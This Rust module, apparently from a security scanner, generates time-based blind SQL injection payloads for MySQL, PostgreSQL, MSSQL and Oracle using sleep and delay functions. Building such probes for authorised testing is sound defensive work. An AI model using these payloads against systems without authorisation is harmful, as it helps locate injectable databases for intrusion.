#![deny(unsafe_code)]

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct TimePayload {
    pub payload: String,
    pub sleep_secs: u64,
    pub dbms: Option<String>,
}

impl TimePayload {
    #[must_use]
    pub fn new(payload: impl Into<String>, sleep_secs: u64, dbms: Option<String>) -> Self {
        Self {
            payload: payload.into(),
            sleep_secs,
            dbms,
        }
    }
}

/// # Panics
/// Panics if `secs < 1`.
#[must_use]
pub fn time_payload_for(dbms: Option<&str>, secs: u64) -> TimePayload {
    assert!(secs >= 1, "sleep_secs must be >= 1");
    let s = secs;
    #[allow(clippy::match_same_arms)]
    let payload = match dbms {
        Some("mysql") => format!("' AND SLEEP({s}) -- -"),
        Some("postgres") => format!("'; SELECT pg_sleep({s}) --"),
        Some("mssql") => {
            let h = s / 3600;
            let m = (s % 3600) / 60;
            let sec = s % 60;
            format!("'; WAITFOR DELAY '{h:02}:{m:02}:{sec:02}' --")
        }
        Some("oracle") => format!("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{s}) --"),
        _ => format!("' AND SLEEP({s}) -- -"),
    };
    TimePayload::new(payload, secs, dbms.map(str::to_owned))
}
